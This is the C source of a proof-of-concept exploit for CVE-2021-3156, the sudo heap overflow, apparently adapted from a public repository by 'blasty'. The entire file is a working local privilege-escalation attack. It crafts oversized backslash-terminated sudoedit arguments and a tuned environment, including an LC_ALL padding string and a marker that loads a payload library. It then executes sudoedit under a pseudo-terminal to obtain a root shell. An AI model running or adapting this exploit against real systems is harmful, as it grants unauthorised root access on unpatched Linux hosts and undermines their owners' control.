/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>
#include <pty.h>
#include <termios.h>
#include <fcntl.h>
#include <libgen.h>

#include <sys/select.h>
#include <sys/wait.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512
#define SUDOEDIT_PATH "/usr/bin/sudoedit"

typedef struct {
    char *target_name;
    char *sudoedit_path;
    uint32_t smash_len_a;
    uint32_t smash_len_b;
    uint32_t null_stomp_len;
    uint32_t lc_all_len;
} target_t;

/* main from: https://github.com/blasty/CVE-2021-3156/blob/main/hax.c */
int exploit(int argc, char *argv[]) {
    if (argc != 5) {
        return -1;
    }

    target_t *target = NULL;
    target = malloc(sizeof(target_t));
    target->target_name    = "Manual";
    target->sudoedit_path  = SUDOEDIT_PATH;
    target->smash_len_a    = atoi(argv[1]);
    target->smash_len_b    = atoi(argv[2]);
    target->null_stomp_len = atoi(argv[3]);
    target->lc_all_len     = atoi(argv[4]);

    printf(
        "using target: %s '%s' (%d, %d, %d, %d)\n",
        target->target_name,
        target->sudoedit_path,
        target->smash_len_a,
        target->smash_len_b,
        target->null_stomp_len,
        target->lc_all_len
    );

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, '#', target->smash_len_a);
    memset(smash_b, '#', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}

int main(int argc, char *argv[]) {
    int tty_fd;
    pid_t pid = 0;

    pid = forkpty(&tty_fd, NULL, NULL, NULL);

    if (pid < 0) {
        printf("forkpty(3) failed\n");
        return -1;
    } else if (pid == 0) {
        /* need to set the working directory so the payload lib can be loaded from a relative path */
        char *path = realpath(argv[0], NULL);
        if (path) {
            chdir(dirname(path));
            free(path);
        }

        return exploit(argc, argv);
    }

    for (;;) {
        char input;
        char output;
        fd_set read_fd;

        FD_ZERO(&read_fd);
        FD_SET(tty_fd, &read_fd);
        FD_SET(STDIN_FILENO, &read_fd);

        select(tty_fd + 1, &read_fd, NULL, NULL, NULL);

        if (FD_ISSET(tty_fd, &read_fd)) {
            if (read(tty_fd, &output, 1) != -1)
                write(STDOUT_FILENO, &output, 1);
            else
                break;
        }
    }
    return 0;
}
